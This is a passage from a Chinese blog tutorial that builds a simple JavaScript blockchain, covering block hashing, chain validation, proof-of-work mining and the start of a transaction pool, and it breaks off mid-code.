title="1、简易区块链搭建"></a>1、简易区块链搭建</h2><p>区块链，顾名思义是由一个个区块相连接而成组成的<strong>链式结构</strong></p><p>所以我们先定义Chain和Block类</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> sha256 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto-js/sha256&#x27;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Block</span>&#123;<br>    <br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">data, preHash</span>)&#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = data <span class="hljs-comment">// 区块储存的数据</span><br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">preHash</span> = preHash <span class="hljs-comment">// 储存上一个区块数据的哈希值</span><br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">hash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeHash</span>() <span class="hljs-comment">// 当前区块数据的哈希值</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// 生成该区块的Hash</span><br>    <span class="hljs-title function_">computeHash</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">sha256</span>(<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> +<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">preHash</span><br>        ).<span class="hljs-title function_">toString</span>()<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Chain</span>&#123;<br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span> = [<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">makeGenesis</span>()] <span class="hljs-comment">// 一个链中应由多个区块组成所以赋值成数组</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// 生成起始区间</span><br>    <span class="hljs-title function_">makeGenesis</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-string">&#x27;Origin&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-comment">// 起始区块，索引为0，所以preHash为0</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> fanChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Chain</span>()<br><span class="hljs-keyword">const</span> block1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-string">&#x27;b1&#x27;</span>, <span class="hljs-string">&#x27;111&#x27;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fanChain)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(block1)<br></code></pre></td></tr></table></figure><p>运行得：</p><p><img src="/posts/32752/image-20231124142339969.png" alt="image-20231124142339969"></p><p>此时链上只有<strong>起始区块</strong></p><p>那要把我们定义的<code>block1</code>加到<code>fanChain</code>上，就要在<code>chain</code>上构造相应方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/////////// class Chain ///////////</span><br><br><span class="hljs-comment">// 获得最新的区块</span><br>  <span class="hljs-title function_">getLatestBlock</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>]<br>  &#125;<br><br><span class="hljs-comment">// 手动增加区块</span><br>  <span class="hljs-title function_">addBlock</span>(<span class="hljs-params">newBlock</span>) &#123;<br>    newBlock.<span class="hljs-property">preHash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getLatestBlock</span>().<span class="hljs-property">hash</span><br>    <span class="hljs-comment">// 因为在外部无法得知此时的preHash是什么，所以手动赋值</span><br>    newBlock.<span class="hljs-property">hash</span> = newBlock.<span class="hljs-title function_">computeHash</span>()<br>    <span class="hljs-comment">// computeHash()在Block类是构造时候调用的，但是newBlock传入的时候没有preHash，所以构造的Hash是错的，需要重新生成</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-title function_">push</span>(newBlock) <span class="hljs-comment">// 别忘了往链上添加</span><br>  &#125;<br><br><span class="hljs-keyword">const</span> fanChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Chain</span>()<br><span class="hljs-keyword">const</span> block1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-string">&#x27;b1&#x27;</span>, <span class="hljs-string">&#x27;111&#x27;</span>)<br><span class="hljs-keyword">const</span> block2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-string">&#x27;b2&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>fanChain.<span class="hljs-title function_">addBlock</span>(block1)<br>fanChain.<span class="hljs-title function_">addBlock</span>(block2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fanChain)<br><br></code></pre></td></tr></table></figure><p><img src="/posts/32752/image-20231124145754763.png" alt="image-20231124145754763"></p><p>可以看到：</p><ul><li><code>b1</code>的<code>preHash</code>与上一个区块<code>Origin</code>的<code>hash</code>一致</li><li><code>b2</code>的<code>preHash</code>与上一个区块<code>b1</code>的<code>hash</code>一致</li><li>成功链接</li></ul><p>这时候需要考虑一个问题，因为区块链具有不可篡改性</p><p>但是如果我们直接通过<code>fanChain.chain[1].data = &#39;fake&#39;</code>进行更改data数据</p><p><img src="/posts/32752/image-20231124150247884.png" alt="image-20231124150247884"></p><p>会发现<code>b1</code>的数据被篡改了，但是<code>hash</code>依旧不变，所以我们要对链中的区块增加校验过程</p><p>校验要进行的过程有：</p><ul><li>对比<code>Block</code>上储存的<code>hash</code>（也就是刚创建区块时候的<code>hash</code>）与通过当前<code>Block</code>数据再次生成的<code>hash</code>，以判断区块的<code>data</code>有没有被篡改</li><li>上一个区块的<code>hash</code>与当前区块的<code>preHash</code>是否一致，也就是是否构成链式结构</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/////////// class Chain ///////////</span><br><br><span class="hljs-comment">// 对区块进行校验</span><br>  <span class="hljs-title function_">validateChain</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-comment">// 因为起始区块没有preHash所以单独校验</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-property">length</span> === <span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[<span class="hljs-number">0</span>].<span class="hljs-property">hash</span> !== <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[<span class="hljs-number">0</span>].<span class="hljs-title function_">computeHash</span>()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>      <span class="hljs-comment">// 对初始进行校验，原始的Hash与再次生成的Hash进行对比</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-property">length</span>; i++) &#123;<br><br>      <span class="hljs-comment">// 判断当前Block的data是否被篡改</span><br>      <span class="hljs-keyword">const</span> blockToValidate = <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[i]<br>      <span class="hljs-keyword">if</span> (blockToValidate.<span class="hljs-property">hash</span> !== blockToValidate.<span class="hljs-title function_">computeHash</span>()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br><br>      <span class="hljs-comment">// 比对前一个Block与当前Block的hash值是否相同</span><br>      <span class="hljs-keyword">const</span> preBlock = <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[i - <span class="hljs-number">1</span>]<br>      <span class="hljs-keyword">if</span> (preBlock.<span class="hljs-property">hash</span> !== blockToValidate.<span class="hljs-property">preHash</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>  &#125;<br><br><span class="hljs-keyword">const</span> fanChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Chain</span>()<br><span class="hljs-keyword">const</span> block1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-string">&#x27;b1&#x27;</span>, <span class="hljs-string">&#x27;111&#x27;</span>)<br><span class="hljs-keyword">const</span> block2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-string">&#x27;b2&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>fanChain.<span class="hljs-title function_">addBlock</span>(block1)<br>fanChain.<span class="hljs-title function_">addBlock</span>(block2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fanChain.<span class="hljs-title function_">validateChain</span>())<br><br><span class="hljs-comment">// 尝试篡改区块</span><br>fanChain.<span class="hljs-property">chain</span>[<span class="hljs-number">1</span>].<span class="hljs-property">data</span> = <span class="hljs-string">&#x27;fake&#x27;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fanChain.<span class="hljs-title function_">validateChain</span>())<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fanChain)<br><br></code></pre></td></tr></table></figure><p><img src="/posts/32752/image-20231124150847683.png" alt="image-20231124150847683"></p><p>可以发现<code>fanChain</code>在被人工篡改之后，被校验出来了</p><p>其次，我们也可以同时篡改区块的<code>hash</code></p><p><code>fanChain.chain[1].hash = fanChain.chain[1].computeHash()</code></p><p><img src="/posts/32752/image-20231124151938859.png" alt="image-20231124151938859"></p><p>但是发现依然校验失败，这是因为<code>b1</code>的<code>hash</code>改变了，所以导致<code>b2</code>的<code>preHash</code>与<code>b1</code>的<code>hash</code>不一致了，上下无法链接</p><h2 id="2、实现工作量证明机制"><a href="#2、实现工作量证明机制" class="headerlink" title="2、实现工作量证明机制"></a>2、实现工作量证明机制</h2><p>上述实现了一个简单的区块链结构，我们只要通过<code>computeHash</code>算出哈希值就可以把区块加到链上</p><p>但是比特币中，需要生成的<code>hash</code>满足特定条件，比如哈希前缀三位全为0，等…</p><p>所以如果需要满足的条件越多，需要的算力就越大</p><ul><li>这里我们定义<code>nonce</code>作为改变量</li><li>用<code>mine()</code>进行穷举比对</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/////////// class Block ///////////</span><br><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">data, preHash</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = data <span class="hljs-comment">// 区块储存的数据</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">preHash</span> = preHash <span class="hljs-comment">// 储存上一个区块数据的哈希值</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">nonce</span> = <span class="hljs-number">0</span> <span class="hljs-comment">// 挖（比对）的次数</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">hash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeHash</span>() <span class="hljs-comment">// 当前区块数据的哈希值</span><br>  &#125;<br><br><span class="hljs-comment">// 生成该区块的Hash</span><br>  <span class="hljs-title function_">computeHash</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">sha256</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">nonce</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">preHash</span>).<span class="hljs-title function_">toString</span>() <span class="hljs-comment">// 增加nonce作为改变量</span><br>  &#125;<br><br><span class="hljs-comment">// 生成挖矿所比对的前缀 difficulty越大需要时间越长</span><br>  <span class="hljs-title function_">getAnswer</span>(<span class="hljs-params">difficulty</span>) &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-title class_">Ans</span> = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> u = <span class="hljs-number">0</span>; u &lt; difficulty; u++) &#123;<br>      <span class="hljs-title class_">Ans</span> += <span class="hljs-string">&#x27;0&#x27;</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Ans</span><br>  &#125;<br><br><span class="hljs-comment">// 挖！</span><br>  <span class="hljs-title function_">mine</span>(<span class="hljs-params">difficulty</span>) &#123;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">hash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeHash</span>()<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">hash</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, difficulty) === <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAnswer</span>(difficulty))<br>        <span class="hljs-comment">// 进行前缀比对</span><br>        <span class="hljs-keyword">break</span><br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">nonce</span>++<br>    &#125;<br>  &#125;<br><br><br><span class="hljs-comment">/////////// class Chain ///////////</span><br><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span> = [<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">makeGenesis</span>()] <span class="hljs-comment">// 一个链中应由多个区块组成所以赋值成数组</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">difficulty</span> = <span class="hljs-number">3</span> <span class="hljs-comment">// 设置难度为3，也就是需要hash满足前缀三位全为0</span><br>  &#125;<br><br><span class="hljs-comment">// 手动增加区块</span><br>  <span class="hljs-title function_">addBlock</span>(<span class="hljs-params">newBlock</span>) &#123;<br>    newBlock.<span class="hljs-property">preHash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getLatestBlock</span>().<span class="hljs-property">hash</span><br>    <span class="hljs-comment">// 因为在外部无法得知此时的preHash是什么，所以手动赋值</span><br>    newBlock.<span class="hljs-property">hash</span> = newBlock.<span class="hljs-title function_">computeHash</span>()<br>    <span class="hljs-comment">// computeHash()在Block类是构造时候调用的，但是newBlock传入的时候没有preHash，所以构造的Hash是错的，需要重新生成</span><br>    newBlock.<span class="hljs-title function_">mine</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">difficulty</span>) <span class="hljs-comment">// 进行比对前缀</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-title function_">push</span>(newBlock) <span class="hljs-comment">// 别忘了往链上添加</span><br>  &#125;<br><br><br><span class="hljs-keyword">const</span> fanChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Chain</span>()<br><span class="hljs-keyword">const</span> block1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-string">&#x27;b1&#x27;</span>, <span class="hljs-string">&#x27;111&#x27;</span>)<br><span class="hljs-keyword">const</span> block2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-string">&#x27;b2&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>fanChain.<span class="hljs-title function_">addBlock</span>(block1)<br>fanChain.<span class="hljs-title function_">addBlock</span>(block2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fanChain)<br></code></pre></td></tr></table></figure><p><img src="/posts/32752/image-20231124154532552.png" alt="image-20231124154532552"></p><p>观察发现在<code>nonce</code>为4649和3687时得到可行的<code>hash</code></p><h2 id="3、创造自己的数字货币"><a href="#3、创造自己的数字货币" class="headerlink" title="3、创造自己的数字货币"></a>3、创造自己的数字货币</h2><p>既然说货币，那便是用来交易的</p><p>所以我们可以把上述的<code>Block</code>类中的<code>data</code>改变为交易内容<code>Transaction</code>，以实现转账</p><p>所以我们追加一个<code>Transaction</code>类，既然是交易，那必然包含</p><ul><li>转账人</li><li>收款人</li><li>数额</li><li>时间</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Transaction</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">from</span>, to, amount, timeStamp</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">from</span> = <span class="hljs-keyword">from</span> <span class="hljs-comment">// 发送者公钥</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">to</span> = to <span class="hljs-comment">// 接收者公钥</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">amount</span> = amount <span class="hljs-comment">// 转账数量</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">timeStamp</span> = timeStamp<br>  &#125;<br>    <br>    <span class="hljs-comment">// 生成对应数据的hash</span><br>  <span class="hljs-title function_">computeHash</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">sha256</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">from</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">to</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">amount</span>  + <span class="hljs-variable language_">this</span>.<span class="hljs-property">timeStamp</span> ).<span class="hljs-title function_">toString</span>()<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">/////////// class Block ///////////</span><br><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">transactions<span class="hljs-comment">/* data */</span>, preHash</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transactions</span> = transactions <span class="hljs-comment">// 本来是this.data = data</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">preHash</span> = preHash<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">nonce</span> = <span class="hljs-number">0</span> <span class="hljs-comment">// 挖的次数</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">hash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeHash</span>()<br>  &#125;<br><br><span class="hljs-comment">// 生成该区块的Hash</span><br>  <span class="hljs-title function_">computeHash</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">sha256</span>(<br>      <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">transactions</span>) + <span class="hljs-comment">// Transaction是对象，所以用JSON.stringify将其字符化</span><br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">preHash</span> +<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">nonce</span> <br>    ).<span class="hljs-title function_">toString</span>()<br>  &#125;<br></code></pre></td></tr></table></figure><p>但是上述的时间戳<code>timeStamp</code>在比特币作者的论文里，是要在<code>block</code>中进行生成的，而不是在<code>Transaction</code>，所以进行修改</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Transaction</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">from</span>, to, amount, timeStamp</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">from</span> = <span class="hljs-keyword">from</span> <span class="hljs-comment">// 发送者公钥</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">to</span> = to <span class="hljs-comment">// 接收者公钥</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">amount</span> = amount <span class="hljs-comment">// 转账数量</span><br>    <span class="hljs-comment">// this.timeStamp = timeStamp</span><br>  &#125;<br>    <br>    <span class="hljs-comment">// 生成对应数据的hash</span><br>  <span class="hljs-title function_">computeHash</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">sha256</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">from</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">to</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">amount</span> <span class="hljs-comment">/* + this.timeStamp */</span>).<span class="hljs-title function_">toString</span>()<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">/////////// class Block ///////////</span><br><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">transactions<span class="hljs-comment">/* data */</span>, preHash</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transactions</span> = transactions <span class="hljs-comment">// 本来是this.data = data</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">preHash</span> = preHash<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">nonce</span> = <span class="hljs-number">0</span> <span class="hljs-comment">// 挖的次数</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">hash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeHash</span>()<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">timeStamp</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() <span class="hljs-comment">// 在Block类中进行生成</span><br>  &#125;<br><br><span class="hljs-comment">// 生成该区块的Hash</span><br>  <span class="hljs-title function_">computeHash</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">sha256</span>(<br>      <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">transactions</span>) + <span class="hljs-comment">// Transaction是对象，所以用JSON.stringify将其字符化</span><br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">preHash</span> +<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">nonce</span> +<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">timeStamp</span> <span class="hljs-comment">// 在这里添加</span><br>    ).<span class="hljs-title function_">toString</span>()<br>  &#125;<br></code></pre></td></tr></table></figure><p>上面写道把data改为Transaction交易数据</p><p>所以现在的这个区块链相当于一个池子（TransactionPool）装满了交易（Transaction）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/////////// class Chain ///////////</span><br><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span> = [<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">makeGenesis</span>()] <span class="hljs-comment">// 一个链中应由多个区块组成所以赋值成数组</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">difficulty</span> = <span class="hljs-number">3</span> <span class="hljs-comment">// 设置难度为3，也就是需要hash满足前缀三位全为0</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transactionPool</span> = [] <span class="hljs-comment">// 装载交易数据的pool</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">minerReward</span> = <span class="hljs-number">50</span> <span class="hljs-comment">// 奖励数额，随着挖的区块数量越多随之减半</span><br>  &#125;<br></code></pre></td></tr></table></figure><p>这时候我们回到先前的<code>addBlock</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 手动增加区块</span><br>  <span class="hljs-title function_">addBlock</span>(<span class="hljs-params">newBlock</span>) &#123;<br>    newBlock.<span class="hljs-property">preHash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getLatestBlock</span>().<span class="hljs-property">hash</span><br>    <span class="hljs-comment">// 因为在外部无法得知此时的preHash是什么，所以手动赋值</span><br>    newBlock.<span class="hljs-property">hash</span> = newBlock.<span class="hljs-title function_">computeHash</span>()<br>    <span class="hljs-comment">// computeHash()在Block类是构造时候调用的，但是newBlock传入的时候没有preHash，所以构造的Hash是错的，需要重新生成</span><br>    newBlock.<span class="hljs-title function_">mine</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">difficulty</span>) <span class="hljs-comment">// 进行比对前缀</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span 